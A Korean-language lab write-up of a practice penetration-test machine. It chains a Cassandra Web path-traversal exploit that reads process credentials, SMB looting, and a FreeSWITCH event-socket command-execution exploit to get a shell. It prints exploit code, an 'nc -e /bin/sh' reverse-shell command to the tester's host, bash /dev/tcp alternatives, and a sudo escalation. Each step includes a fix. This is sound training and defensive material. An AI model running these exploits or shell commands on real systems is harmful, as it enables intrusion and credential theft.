---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/svc/smb
  - tech/lin/sudo-abuse
  - tech/exec/ssh-key
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.115.240
ports: [22, 80, 139, 445, 3000, 8021]
services: [freeswitch-event, http, netbios-ssn, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.115.240`(리버트 후 `.178.240` → `.239.240`) · Debian 10 buster, 커널 4.19.0-21-amd64 · 호스트명 `clue`(FQDN `clue.pg`) · Advanced · 플래그 2/2
> 진입점: Cassandra Web 0.5.0 경로 순회(무인증)로 `/proc/self/cmdline` 자격증명 채굴 → SMB 약탈 → FreeSWITCH ESL(8021) 원격 명령실행으로 셸
> 권한상승: `cassie` 가 sudo NOPASSWD 로 `cassandra-web` 을 root 권한 재실행 → 같은 경로 순회를 root 로 다시 걸어 `/home/anthony/.ssh/id_rsa` 획득 → root 로그인
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.115.240

### Initial Access – Cassandra Web 0.5.0 경로 순회로 채굴한 DB 자격증명이 FreeSWITCH ESL 원격 명령실행으로 이어짐

**Vulnerability Explanation:**
- Cassandra Web 0.5.0 이 `Rack::Protection`(특히 `PathTraversal` 미들웨어)을 비활성화한 채 정적 자산을 서빙 — 요청 경로의 `../` 가 정규화되지 않아 임의 파일 읽기 성립(CVE 번호 없음, EDB 49362)
- 앱이 백엔드 Apache Cassandra DB 접속 자격증명을 CLI 인자(`-u`/`-p`)로 받음 — 파일 읽기로 `/proc/self/cmdline` 을 읽으면 그 자격증명이 프로세스 인자에 평문으로 노출
- FreeSWITCH `mod_event_socket`(8021/tcp) 이 `apply-inbound-acl` 주석 처리 + `listen-ip 0.0.0.0` 상태로 원격에 열려 있고, 비밀번호 인증만 통과하면 `api system <cmd>` 로 임의 명령 실행 허용(EDB 47799)

**Vulnerability Fix:**
- Cassandra Web 을 0.6.0 이상으로 올리거나 컨테이너/AppArmor 샌드박스에서 구동. 관리 UI 는 인터넷에 직접 노출하지 않음
- 비밀을 CLI 인자로 넘기지 않음 — `EnvironmentFile=`(0600) 이나 설정 파일 사용
- ESL 에 `apply-inbound-acl`(`loopback.auto`) 적용, `listen-ip` 를 `127.0.0.1` 로 제한

**Severity:** Critical — 무인증 원격 파일 읽기가 자격증명 체인을 거쳐 원격 명령 실행으로 이어짐

**Steps to reproduce the attack:**
1. `searchsploit cassandra` → EDB 49362 확보, 경로 순회로 `/etc/passwd` 읽어 동작 확인
2. `/proc/self/cmdline` 읽어 Cassandra DB 자격증명 `cassie:SecondBiteTheApple330` 채굴
3. SSH 는 거부되나 SMB(`//CLUE/backup`)는 통과 — `/etc/freeswitch` 백업 트리 약탈
4. 백업 `event_socket.conf.xml` 은 `ClueCon`(FreeSWITCH 기본값)이었으나, 경로 순회로 live 설정을 직접 읽어 실제 비밀번호 `StrongClueConEight021` 확인
5. `searchsploit freeswitch` → EDB 47799(하드코딩 비밀번호를 실제 값으로 수정) 확보, ESL(8021)에 `api system` 명령 실행 확인
6. 리버스셸로 FreeSWITCH 서비스 계정 셸 획득 → `su cassie`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.115.240 | TCP: 22, 80, 139, 445, 3000, 8021 |

`nnmap` 은 오타가 아니라 별칭이다 (`~/.zshrc:247`):

```text
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

```bash
kali@kali:~/PG/Clue$ nnmap 192.168.115.240
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 15:42 +0900
Nmap scan report for 192.168.115.240
Host is up (0.067s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-title: Cassandra Web
|_http-server-header: thin
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-06-15T02:43:49-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m37s, median: 0s
| smb2-time:
|   date: 2026-06-15T06:43:46
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   66.74 ms 192.168.45.1
2   66.65 ms 192.168.45.254
3   67.31 ms 192.168.251.1
4   67.39 ms 192.168.115.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.98 seconds
```
— 출처: `~/PG/Clue/nmap.log`

`Not shown: 65529 filtered tcp ports (no-response)` — 방화벽이 앞단에 있음을 시사. `filtered` 는 `closed`(reset) 와 달리 응답 자체가 없다는 뜻이고, nmap 이 OS 지문을 못 잡은 이유(`could not find at least 1 open and 1 closed port`)도 이것.

공격면 우선순위: 3000(Cassandra Web, 제목에 제품명 노출)이 exploit-db 적중률 최우선, 8021(FreeSWITCH ESL, nmap이 정확히 지문 식별)이 2순위, 445/139(Samba 4.9.5-Debian)는 자격증명 확보 후 재방문 대상, 80(Apache, 루트 403)은 후순위, 22(OpenSSH 7.9p1)는 Debian 10 확정 근거이자 자격증명 대기.

`smb-os-discovery` 가 인증 없이 호스트명 `clue`·FQDN `clue.pg`·도메인 `pg` 를 알려줌. `OS: Windows 6.1 (Samba 4.9.5-Debian)` 은 Samba가 하위 호환을 위해 내보내는 Windows 7 문자열이며 실제 OS 는 Linux — Windows 익스플로잇으로 오도되지 않도록 유의.

**버전 근거 — Cassandra Web**

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ searchsploit cassandra
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow        | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                              | linux/webapps/49362.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/Clue]
└─$ searchsploit -m 49362
  Exploit: Cassandra Web 0.5.0 - Remote File Read
      URL: https://www.exploit-db.com/exploits/49362
     Path: /usr/share/exploitdb/exploits/linux/webapps/49362.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/PG/Clue/49362.py
```
— 출처: `파일보관\Pasted image 20260616140217.png`(터미널 스크린샷)

![[Pasted image 20260616140217.png]]

버전 근거는 이 하나뿐 — nmap 은 `http-title: Cassandra Web` 만 알려줬고 버전 문자열은 없었음. exploit-db 에 Cassandra Web 항목이 하나뿐이라 0.5.0 을 그대로 시도, 결과적으로 적중. 사후에 `/proc/self/cmdline` 에서 `ruby2.5` 확인 + 경로 순회 상수(`DT_NUM=8`)가 실제 gem 경로 깊이와 일치해 간접 검증됨. `Codes: N/A` · `Verified: False` — CVE 번호 없음, EDB 미검증 익스플로잇.

포트 80(Apache 2.4.38)은 루트 `403 Forbidden` — 디렉터리 열거는 하지 않음(3000/8021 경로로 충분).

### Initial Access – Cassandra Web traversal → FreeSWITCH ESL RCE

**경로 순회 배경.** Cassandra Web 은 Ruby(Sinatra/Rack) 기반 웹 UI 이고 정적 자산을 gem 내 `app/public` 에서 서빙. 익스플로잇 저자 주석 원문:

```bash
# Cassandra Web is vulnerable to directory traversal due to the disabled
# Rack::Protection module. Apache Cassandra credentials are passed via the
# CLI in order for the server to auth to it and provide the web access, so
# they are also one thing that can be captured via the arbitrary file read.
```

`Rack::Protection` 비활성화로 `../` 미정규화, 자격증명이 CLI 인자로 전달됨 — 두 문장이 이 취약점의 전부. 이 결함에는 CVE 번호가 없음(EDB `Codes: N/A`), 벤더 v0.6.0에서 수정.

익스플로잇 상수:

```python
SIGNATURE = 'cassandra.js'

#
# /var/lib/gems/2.7.0/gems/cassandra-web-0.5.0/app/public
#
DT = '../'
DT_NUM = 8
```

서빙 루트 `/var/lib/gems/2.7.0/gems/cassandra-web-0.5.0/app/public` 에서 `/` 까지:

```text
public(1) → app(2) → cassandra-web-0.5.0(3) → gems(4)
  → 2.7.0(5) → gems(6) → lib(7) → var(8)     = 8 단계
```

타겟 루비는 실제로 2.5(`/proc/self/cmdline` 확인)라 경로 문자열은 다르지만 깊이는 동일해 8이 그대로 통함. 루트 도달 후 초과 `../` 는 POSIX 상 무해(`/.. == /`)하므로 넉넉히 넣는 편이 안전. 깊이 조절 옵션은 `-n`(`python 49362.py TARGET /etc/passwd -n 12`).

익스플로잇의 판정 로직 원문:

```python
if(SIGNATURE not in deskpop.text and self.force == False):
    print("Target doesn't look like Cassandra Web, aborting...")
    return -1
...
if(SIGNATURE in req.text):
    print("Failed to read %s (bad path?)" % self.file)
    return -1
```
— 출처: `~/PG/Clue/49362.py`

두 검사가 정반대 방향 — 먼저 루트 페이지에 `cassandra.js` 가 있어야 타겟으로 인정하고(`-f` 로 무시 가능), 그다음 traversal 응답에 `cassandra.js` 가 없어야 성공으로 판정(있으면 traversal 이 씹혀 그냥 index 를 돌려받은 것).

동작 확인:

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ python 49362.py 192.168.115.240 -p 3000 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```
— 출처: `49362.py` 실행 화면 — `파일보관\Pasted image 20260616141139.png`

![[Pasted image 20260616141139.png]]

`/bin/bash` 셸을 가진 계정은 `cassie`(UID 1000, 첫 실사용자)와 `anthony`(UID 1001) 둘뿐 — 이 박스의 사람 계정 전체이자 로그인 대상 후보. `freeswitch` 는 서비스 계정으로 홈이 `/var/lib/freeswitch`, 뒤에서 `local.txt` 위치가 된다. `cassandra` 는 로그인 불가.

**자격증명 채굴 — `/proc/self/cmdline`.** 49362.py 소스 주석의 사용 예시가 힌트:

```bash
kali@kali:~/PG/Clue$ cat 49362.py
# Exploit Title: Cassandra Web 0.5.0 - Remote File Read
# Date: 12-28-2020
# Exploit Author: Jeremy Brown
# Vendor Homepage: https://github.com/avalanche123/cassandra-web
# Software Link: https://rubygems.org/gems/cassandra-web/versions/0.5.0
# Version: 0.5.0
# Tested on: Linux

#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# cassmoney.py
#
# Cassandra Web 0.5.0 Remote File Read Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# Dec 2020
#
# Cassandra Web is vulnerable to directory traversal due to the disabled
# Rack::Protection module. Apache Cassandra credentials are passed via the
# CLI in order for the server to auth to it and provide the web access, so
# they are also one thing that can be captured via the arbitrary file read.
#
# Usage
# > cassmoney.py 10.0.0.5 /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# ...
#
 > cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
#
# Fix
# - fixed in github repo
# - v0.6.0 / ruby-gems when available
# (still recommended to containerize / run this in some sandbox, apparmor, etc)
<SNIP>
```
— 출처: `~/PG/Clue/49362.py`

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ python 49362.py 192.168.115.240 -p 3000 /proc/self/cmdline

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```
— 출처: 원본 writeup 기록 보존 · `파일보관\Pasted image 20260616142532.png`

![[Pasted image 20260616142532.png]]

`/proc/*/cmdline` 은 argv 원소가 NUL(`\0`)로 구분되는데 HTTP 응답으로 나오며 사라져 전부 붙어 보인다:

```text
/usr/bin/ruby2.5 \0 /usr/local/bin/cassandra-web \0 -u \0 cassie \0 -p \0 SecondBiteTheApple330
 └── 인터프리터 ──┘  └────── 스크립트 ──────────┘  └ 플래그와 값 ─────────────────────┘
```

읽어낸 값 — 사용자 `cassie` / 비밀번호 `SecondBiteTheApple330`. 저자 예시는 `--username`/`--password` 긴 형식이었으나 타겟은 `-u`/`-p` 짧은 형식 — 형태가 달라도 `-u` 뒤가 사용자, `-p` 뒤가 비밀번호로 읽힘. 파이프로 처리하려면 `tr '\0' '\n'` 이 정석.

**자격증명 재사용 — SSH 거부, SMB 통과.**

```bash
kali@kali:~/PG/Clue$ ssh cassie@192.168.115.240
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
cassie@192.168.115.240's password:
Permission denied, please try again.
cassie@192.168.115.240's password:
Permission denied, please try again.
cassie@192.168.115.240's password:
```
— 출처: `파일보관\Pasted image 20260616144300.png`(터미널 스크린샷)

![[Pasted image 20260616144300.png]]

관측된 것은 `Permission denied, please try again.` 반복뿐. [가정] `sshd_config` 의 `AllowUsers`/`DenyUsers` 또는 `PasswordAuthentication no` 로 제한된 것으로 보이나, 타겟이 정지돼 설정 파일로 확인하지 못함. **한 서비스의 거부가 자격증명의 오류를 뜻하지 않음** — 같은 비밀번호가 SMB 와 로컬 `su` 로는 통과함(아래).

```bash
kali@kali:~/PG/Clue$ smbclient -U 'cassie%SecondBiteTheApple330' //192.168.115.240/backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug  5 17:43:50 2022
  ..                                  D        0  Fri Aug  5 17:43:44 2022
  freeswitch                          D        0  Fri Aug  5 17:43:51 2022
  cassandra                           D        0  Sat May  7 00:04:47 2022

                14343176 blocks of size 1024. 10586260 blocks available
smb: \>
```
— 출처: 원본 writeup 기록 보존 · `파일보관\Pasted image 20260616144814.png`

![[Pasted image 20260616144814.png]]

`-U 'user%password'` 는 대화형 프롬프트를 건너뜀 — 작은따옴표 필수(비밀번호에 `!`·`$` 있으면 셸이 먼저 해석). 재귀 다운로드:

```text
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

`prompt OFF` 를 빼면 파일마다 y/n 을 물음(245개 파일에 245번). `recurse ON` 을 빼면 하위 디렉터리를 안 내려받음. 내려받은 것은 `~/PG/Clue/freeswitch/`(245개 파일, `/etc/freeswitch` 전체)와 `~/PG/Clue/cassandra/`(Cassandra 3.11.13 설치본).

**비밀번호 사냥 — 백업의 함정.**

```bash
┌──(kali㉿kali)-[~/…/Clue/freeswitch/etc/freeswitch]
└─$ grep -ri 'passw'
<SNIP>
directory/default/1003.xml:      <param name="vm-password" value="1003"/>
directory/default/1008.xml:      <param name="password" value="$${default_password}"/>
directory/default/1008.xml:      <param name="vm-password" value="1008"/>

autoload_configs/event_socket.conf.xml:    <param name="password" value="ClueCon"/>

autoload_configs/hash.conf.xml: <!-- <remote name="Test1" host="10.0.0.10" port="8021" password="ClueCon" interval="1000" /> -->
autoload_configs/xml_cdr.conf.xml:         'ssl-key-path'. If your private key has a password, specify it with
<SNIP>
```
— 출처: `~/PG/Clue/freeswitch/etc/freeswitch/`

![[Pasted image 20260616161254.png]]

`ClueCon` — FreeSWITCH 의 유명한 기본 비밀번호. 백업본 원문(`event_socket.conf.xml`) 전체:

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ cat freeswitch/etc/freeswitch/autoload_configs/event_socket.conf.xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="::"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="ClueCon"/>
    <!--<param name="apply-inbound-acl" value="loopback.auto"/>-->
    <!--<param name="stop-on-bind-error" value="true"/>-->
  </settings>
</configuration>
```
— 출처: `~/PG/Clue/freeswitch/etc/freeswitch/autoload_configs/event_socket.conf.xml`

원격 접속을 막는 `apply-inbound-acl`(`loopback.auto`) 줄이 `<!-- -->` 로 주석 처리돼 적용되지 않음. `listen-ip` 도 `::`(모든 인터페이스) — 기본 설정 자체가 이미 원격에 열려 있음. 이건 백업본(`//CLUE/backup` 공유, 2022-08-05 스냅샷)이므로, live 설정을 경로 순회로 직접 읽어 대조:

```bash
kali@kali:~/PG/Clue$ python 49362.py -p 3000 192.168.115.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```
— 출처: 원본 writeup 기록 보존 · `파일보관\Pasted image 20260616164031.png`

![[Pasted image 20260616164031.png]]

| 항목 | SMB 백업본 | live |
|---|---|---|
| `password` | `ClueCon` | `StrongClueConEight021` |
| `listen-ip` | `::` | `0.0.0.0` |
| `apply-inbound-acl` | 주석 처리된 채 존재 | 줄 자체가 없음 |

백업은 과거 스냅샷이지 현재가 아님 — 자격증명을 백업에서 얻으면 가능한 한 live 원본과 교차 확인. `~/.zsh_history` 에 `grep -ri 'Strong*'` 가 남아 있음 — 진짜 비밀번호를 알고 나서 백업본에도 있는지 되짚어본 흔적(없었음).

**FreeSWITCH ESL — 익스플로잇을 손으로 고친다.**

```bash
kali@kali:~/PG/Clue$ searchsploit freeswitch
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)            | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                               | windows/remote/47799.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

kali@kali:~/PG/Clue$ searchsploit -m 47799
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/PG/Clue/47799.txt
```
— 출처: `파일보관\Pasted image 20260616164511.png`(터미널 스크린샷)

![[Pasted image 20260616164511.png]]

적중이 둘 — `47698.rb` 는 Metasploit 모듈, `47799.txt` 는 단독 파이썬. OSCP 는 Metasploit 을 1대에만 허용하므로 그 슬롯을 여기 쓰지 않고 `47799` 를 택함(단독 스크립트는 대상 제한 없음).

`searchsploit -m 47799` 는 `.txt` 로 떨어짐 — Kali 실제 경로는 `/usr/share/exploitdb/exploits/windows/remote/47799.txt`(파이썬 코드인데 확장자가 `.txt`, `~/.zsh_history` 에 `mv 47799.txt 47799.py` 흔적). 받은 원본은 그대로는 실패 — 33번째 줄이 비밀번호를 하드코딩:

| | 값 |
|---|---|
| exploitdb 원본(`/usr/share/exploitdb/exploits/windows/remote/47799.txt:33`) | `PASSWORD='ClueCon' # default password for FreeSWITCH` |
| 이 박스에서 쓴 사본(`~/PG/Clue/47799.py`) | `PASSWORD='StrongClueConEight021' # default password for FreeSWITCH` |

![[Pasted image 20260616164751.png]]

수정 후에도 주석 `# default password for FreeSWITCH` 는 그대로 남아 있음 — `StrongClueConEight021` 은 기본값이 아니라 이 박스 고유 값이므로 이 주석은 오도됨. 공개 익스플로잇을 고치면 주석도 고쳐야 함(원본 값과 수정 값을 여기 나란히 남겨 오염을 막음).

`47799.py` 헤더는 원격 명령을 기본적으로 막는다고 주장하나, 위 백업 설정 파일이 이를 반증함:

```bash
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
```
— 출처: `/usr/share/exploitdb/exploits/windows/remote/47799.txt`(헤더 주석)

원격 차단을 담당하는 것은 `apply-inbound-acl`(`loopback.auto`)인데 위 백업 파일에서 주석 처리돼 있었고 `listen-ip` 도 `::`(모든 인터페이스) — 이 배포판은 기본 설정 자체가 이미 원격에 열려 있어 헤더의 주장과 맞지 않음. 저자는 Windows 인스톨러(x64 MSI)에서 시험했고 배포판마다 출하 설정이 다름을 시사.

ESL 프로토콜은 줄 기반 평문 — `47799.py` 의 핵심 로직:

```python
s.connect((ADDRESS, 8021))
response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
```
— 출처: `~/PG/Clue/47799.py`

인증(`auth <password>\n\n`) 후 `api system <cmd>\n\n`. 빈 줄 두 개가 명령 종결자. `nc` 로도 수동 재현 가능(자동 도구 없이 같은 결과, 시험 대비):

```text
nc 192.168.115.240 8021
auth StrongClueConEight021
(빈 줄)
api system id
(빈 줄)
```

```bash
kali@kali:~/PG/Clue$ python 47799.py 192.168.115.240 'cat /etc/passwd'
Authenticated
Content-Type: api/response
Content-Length: 1622

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```
— 출처: 원본 writeup 기록 보존

`Authenticated` 와 `Content-Type: api/response` 가 ESL 이 실제로 명령을 실행했다는 증거.

**리버스셸.**

```bash
kali@kali:~/PG/Clue$ python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.179 3000'
Authenticated

```
— 출처: 원본 writeup 기록 보존

`-e` 는 netcat-traditional 계열 기능, 타겟 Debian 10 에서 동작 확인됨. Kali 쪽도 확인:

```text
/usr/bin/nc.traditional
```
— 출처: Kali 에서 `readlink -f /usr/bin/nc` 직접 실행(2026-08-26 재확인) — 박스 풀이 당시의 캡처가 아니라 사후 검증임

[가정] openbsd 판 `nc` 는 `-e` 가 없음 — 이 Kali 에는 openbsd 판이 없어 직접 확인 못함. 대안: `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` · `mkfifo` 방식 · `python3 -c 'import socket,os,pty;...'`. 리스너 포트 `3000` 은 Kali 의 리스닝 포트로 타겟 Cassandra Web(3000)과 무관.

**`cassie` 로 전환.** 셸은 FreeSWITCH 서비스 계정(셸 `/bin/false`)으로 붙으므로 곧바로 전환:

```bash
su cassie
SecondBiteTheApple330
whoami
cassie
```
— 출처: 원본 writeup 기록 보존

`su` 는 TTY 를 요구하는 경우가 흔하나 여기서는 통과. 막히면 `python3 -c 'import pty;pty.spawn("/bin/bash")'` 로 TTY 확보. Initial Access(요약) 절의 SSH 거부와 대비 — 거부는 서비스별이지 자격증명의 속성이 아님.

`local.txt` 는 `/var/lib/freeswitch/local.txt`(모드 600, `freeswitch` 소유)라 `cassie` 셸로는 읽을 수 없음 — 실제로는 `Privilege Escalation` 절에서 root 를 획득한 뒤 root 셸에서 읽었음(유보: 이 순서가 정상 진행이었다면 `freeswitch` 계정 자체로 전환해 읽는 경로도 있었을 것이나 이 박스에서는 시도되지 않았음).

**Local.txt value:**
`22288e4fbb81033971802e537c05bdc2`
— 위치: `/var/lib/freeswitch/local.txt`. `Privilege Escalation` 절 재현에 포함된 root 셸에서 읽음(권한상승 이후 획득, 유보 상기)

### Privilege Escalation – sudo NOPASSWD 로 root 권한 재실행한 동일 경로 순회

**Vulnerability Explanation:**
- `cassie` 가 `sudo -u root /usr/local/bin/cassandra-web` 을 NOPASSWD·인자 제한 없이 실행 가능(`sudo -l`)
- 이 바이너리는 Initial Access 절의 경로 순회 취약점을 가진 동일 애플리케이션 — root 권한으로 재기동하면 파일 읽기 범위가 파일시스템 전체로 확장됨
- `env_reset`+`secure_path` 로 PATH·환경변수 조작 경로는 막혀 있으나, "재실행 가능한 서비스 자체의 취약점"은 sudoers 설정으로 막히지 않음

**Vulnerability Fix:**
- `sudo NOPASSWD` 를 네트워크 서비스 바이너리에 부여하지 않음. 꼭 필요하면 인자까지 고정: `cassie ALL=(root) NOPASSWD: /usr/local/bin/cassandra-web -B 127.0.0.1:3000`
- root 의 `authorized_keys` 에 사용자 개인키를 등록하지 않음. `PermitRootLogin no`(`prohibit-password` 조차 키 로그인은 허용)

**Severity:** Critical — NOPASSWD sudo 로 즉시 root 권한 파일 읽기, 곧 root 셸까지 확장

